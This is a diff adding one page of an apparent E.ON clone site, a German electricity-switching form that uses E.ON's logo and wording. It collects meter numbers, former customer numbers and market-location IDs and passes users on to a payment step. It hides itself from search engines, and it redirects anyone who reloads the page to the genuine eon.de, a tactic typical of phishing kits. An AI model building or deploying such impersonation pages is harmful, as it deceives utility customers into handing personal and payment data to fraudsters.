@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta name="robots" content="noindex, nofollow">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Angaben zur Belieferung - E.ON Klon</title>
+    <!-- Tailwind CSS for styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f7f7f7;
+        }
+        .info-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 1.25rem;
+            height: 1.25rem;
+            border: 1.5px solid #9ca3af;
+            border-radius: 50%;
+            color: #9ca3af;
+            font-size: 0.75rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .progress-step { display: flex; flex-direction: column; align-items: center; position: relative; }
+        .progress-step .circle { width: 3rem; height: 3rem; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #d1d5db; background-color: white; z-index: 1; }
+        .progress-step.active .circle { border-color: #111827; background-color: #111827; color: white; }
+        .progress-step.completed .circle { border-color: #111827; background-color: #111827; color: white; }
+        .progress-line { height: 2px; background-color: #d1d5db; width: 100%; position: absolute; top: 1.5rem; transform: translateY(-50%); }
+    </style>
+</head>
+<body class="text-gray-800">
+
+    <!-- Simple Header -->
+    <header class="bg-white border-b">
+        <div class="container mx-auto px-4 sm:px-6 lg:px-8 flex justify-between items-center h-20">
+            <img src="logo.png" alt="E.ON Logo" class="h-8">
+            <div class="flex items-center space-x-4">
+                <button class="text-gray-600 hover:text-red-500"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg></button>
+                <button class="text-gray-600 hover:text-red-500"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" /></svg></button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 sm:px-6 lg:px-8 py-12">
+        <!-- Progress Bar -->
+        <div class="max-w-2xl mx-auto mb-12">
+            <!-- Progress bar code remains the same -->
+        </div>
+
+        <!-- Form and Tariff Summary Grid -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            
+            <!-- Left Column: Form -->
+            <div class="lg:col-span-2 bg-white p-8 rounded-lg shadow-sm border space-y-8">
+                
+                <!-- Section 1: Personal Data Summary -->
+                <section>
+                    <div class="flex justify-between items-center mb-6">
+                        <h2 class="text-2xl font-bold">1/4 Persönliche Daten</h2>
+                        <a href="details.html" class="text-sm font-semibold text-red-600 hover:underline flex items-center">
+                            Bearbeiten <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.5L13.196 5.232z" /></svg>
+                        </a>
+                    </div>
+                    <div id="user-data-summary" class="text-sm text-gray-700 space-y-2">
+                        <!-- User data will be loaded here by JavaScript -->
+                    </div>
+                </section>
+
+                <!-- Section 2: Delivery Information -->
+                <section>
+                    <h2 class="text-2xl font-bold mb-6">2/4 Angaben zur Belieferung</h2>
+                    <div class="space-y-6">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700 mb-2">Haben Sie Ihre Stromzählernummer zur Hand? <span class="info-icon">i</span></label>
+                            <div class="flex space-x-6">
+                                <label class="flex items-center"><input type="radio" name="has-meter-number" value="yes" class="h-4 w-4 text-red-600 border-gray-300 focus:ring-red-500" checked><span class="ml-2">Ja</span></label>
+                                <label class="flex items-center"><input type="radio" name="has-meter-number" value="no" class="h-4 w-4 text-red-600 border-gray-300 focus:ring-red-500"><span class="ml-2">Nein</span></label>
+                            </div>
+                        </div>
+
+                        <!-- This is the container that will be hidden/shown -->
+                        <div id="delivery-details-container" class="space-y-6">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700 mb-2">Welche Situation trifft auf Sie zu?</label>
+                                <div class="space-y-2">
+                                    <label class="flex items-center"><input type="radio" name="situation" class="h-4 w-4 text-red-600 border-gray-300 focus:ring-red-500" checked><span class="ml-2">Ich möchte unter meiner aktuellen Adresse zu E.ON wechseln</span></label>
+                                    <label class="flex items-center"><input type="radio" name="situation" class="h-4 w-4 text-red-600 border-gray-300 focus:ring-red-500"><span class="ml-2">Ich ziehe neu ein und möchte an meiner neuen Adresse von E.ON beliefert werden</span></label>
+                                    <label class="flex items-center"><input type="radio" name="situation" class="h-4 w-4 text-red-600 border-gray-300 focus:ring-red-500"><span class="ml-2">Ich möchte in einem neu gebauten Haus von E.ON beliefert werden</span></label>
+                                </div>
+                            </div>
+                             <div>
+                                <label class="block text-sm font-medium text-gray-700 mb-2">Kündigung Ihres bisherigen Stromliefervertrages <span class="info-icon">i</span></label>
+                                <div class="space-y-2">
+                                    <label class="flex items-center"><input type="radio" name="cancellation" class="h-4 w-4 text-red-600 border-gray-300 focus:ring-red-500" checked><span class="ml-2">E.ON kündigt für mich und erledigt alle Formalitäten</span></label>
+                                    <label class="flex items-center"><input type="radio" name="cancellation" class="h-4 w-4 text-red-600 border-gray-300 focus:ring-red-500"><span class="ml-2">Ich habe bereits gekündigt</span></label>
+                                </div>
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700 mb-2">Gewünschter Lieferbeginn <span class="info-icon">i</span></label>
+                                <div class="space-y-2">
+                                    <label class="flex items-center"><input type="radio" name="delivery-start" class="h-4 w-4 text-red-600 border-gray-300 focus:ring-red-500" checked><span class="ml-2">Nächstmöglicher Termin</span></label>
+                                    <label class="flex items-center"><input type="radio" name="delivery-start" class="h-4 w-4 text-red-600 border-gray-300 focus:ring-red-500"><span class="ml-2">Wunschtermin</span></label>
+                                </div>
+                            </div>
+                            <div>
+                                <label for="prev-provider" class="block text-sm font-medium text-gray-700">Bisheriger Energieversorger*</label>
+                                <input type="text" id="prev-provider" class="mt-1 block w-full p-3 border border-gray-400 rounded-md focus:ring-red-500 focus:border-red-500">
+                            </div>
+                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                                <div class="flex items-center border border-gray-400 rounded-md p-3 focus-within:border-red-500 focus-within:ring-1 focus-within:ring-red-500">
+                                    <input type="text" placeholder="Bisherige Kundennummer" class="flex-grow outline-none bg-transparent">
+                                    <span class="info-icon">i</span>
+                                </div>
+                                <div class="flex items-center border border-gray-400 rounded-md p-3 focus-within:border-red-500 focus-within:ring-1 focus-within:ring-red-500">
+                                    <input type="text" placeholder="Zählernummer*" class="flex-grow outline-none bg-transparent">
+                                    <span class="info-icon">i</span>
+                                </div>
+                            </div>
+                            <div class="flex items-center border border-gray-400 rounded-md p-3 focus-within:border-red-500 focus-within:ring-1 focus-within:ring-red-500">
+                                <input type="text" placeholder="Marktlokations-ID" class="flex-grow outline-none bg-transparent">
+                                <span class="info-icon">i</span>
+                            </div>
+                            <div class="bg-gray-100 p-4 rounded-md text-sm text-gray-700">
+                                <strong>Unser Tipp:</strong> Mit der Marktlokations-ID kann Ihr Wechsel schneller und einfacher bearbeitet werden. Sie finden die Nummer auf Ihrer letzten Rechnung oder in Ihrem Vertrag.
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <div class="pt-6 border-t border-gray-200">
+                    <p class="text-sm text-gray-500 mb-4">*Pflichtfeld</p>
+                    <button class="w-auto bg-red-600 text-white font-bold py-3 px-8 rounded-md hover:bg-red-700 transition duration-200">Weiter</button>
+                </div>
+            </div>
+
+            <!-- Right Column: Tariff Summary (same as details.html) -->
+            <aside class="lg:col-span-1">
+                <div class="bg-white p-6 rounded-lg shadow-sm border sticky top-12">
+                    <!-- Tariff summary code remains the same -->
+                </div>
+            </aside>
+        </div>
+        
+        <!-- Collapsed Sections -->
+        <div class="lg:col-span-2 mt-8 space-y-4 max-w-4xl">
+             <div class="bg-gray-200 p-6 rounded-lg text-gray-500 font-bold text-2xl">3/4 Zahlungsweise</div>
+             <div class="bg-gray-200 p-6 rounded-lg text-gray-500 font-bold text-2xl">4/4 Beauftragung</div>
+        </div>
+    </main>
+
+    <!-- Footer (same as details.html) -->
+    <footer class="bg-white border-t mt-12">
+        <!-- Footer code remains the same -->
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- Load User Data from localStorage ---
+            const userDataSummary = document.getElementById('user-data-summary');
+            const storedData = localStorage.getItem('eonUserData');
+
+            if (storedData) {
+                const userData = JSON.parse(storedData);
+                let formattedDob = '';
+                if (userData.dob) {
+                    const parts = userData.dob.split('-');
+                    formattedDob = `${parts[2]}.${parts[1]}.${parts[0]}`;
+                }
+                userDataSummary.innerHTML = `
+                    <p><strong>Name:</strong> ${userData.salutation} ${userData.title || ''} ${userData.firstName} ${userData.lastName}</p>
+                    <p><strong>Geburtsdatum:</strong> ${formattedDob || '-'}</p>
+                    <p><strong>Firma:</strong> ${userData.company || '-'}</p>
+                    <p><strong>E-Mail:</strong> ${userData.email || '-'}</p>
+                    <p><strong>Telefon:</strong> ${userData.phone || '-'}</p>
+                    <p><strong>Lieferadresse:</strong> ${userData.street || ''} ${userData.houseNr || ''}, ${userData.deliveryAddress || ''}</p>
+                `;
+            }
+
+            // --- Logic for hiding/showing delivery details ---
+            const deliveryDetailsContainer = document.getElementById('delivery-details-container');
+            const radioButtons = document.querySelectorAll('input[name="has-meter-number"]');
+            radioButtons.forEach(radio => {
+                radio.addEventListener('change', (event) => {
+                    if (event.target.value === 'no') {
+                        deliveryDetailsContainer.classList.add('hidden');
+                    } else {
+                        deliveryDetailsContainer.classList.remove('hidden');
+                    }
+                });
+            });
+
+            // --- NEW: Save data and move to next page ---
+            const weiterButton = document.querySelector('button.bg-red-600');
+            weiterButton.addEventListener('click', (e) => {
+                e.preventDefault(); // Prevent default button behavior
+
+                // Gather delivery data
+                const deliveryData = {
+                    hasMeterNumber: document.querySelector('input[name="has-meter-number"]:checked').value,
+                    situation: document.querySelector('input[name="situation"]:checked') ? document.querySelector('input[name="situation"]:checked').nextElementSibling.textContent.trim() : '',
+                    cancellation: document.querySelector('input[name="cancellation"]:checked') ? document.querySelector('input[name="cancellation"]:checked').nextElementSibling.textContent.trim() : '',
+                    deliveryStart: document.querySelector('input[name="delivery-start"]:checked') ? document.querySelector('input[name="delivery-start"]:checked').nextElementSibling.textContent.trim() : '',
+                    prevProvider: document.getElementById('prev-provider').value,
+                };
+
+                // Save data to localStorage
+                localStorage.setItem('eonDeliveryData', JSON.stringify(deliveryData));
+
+                // Navigate to the next page
+                window.location.href = 'payment.html';
+            });
+        });
+    </script>
+    <script>
+      // Modern API to detect reload
+      if (performance.getEntriesByType("navigation")[0].type === "reload") {
+          window.location.href = "https://www.eon.de/de/pk.html";
+      }
+    </script>
+
+
+</body>
+</html>
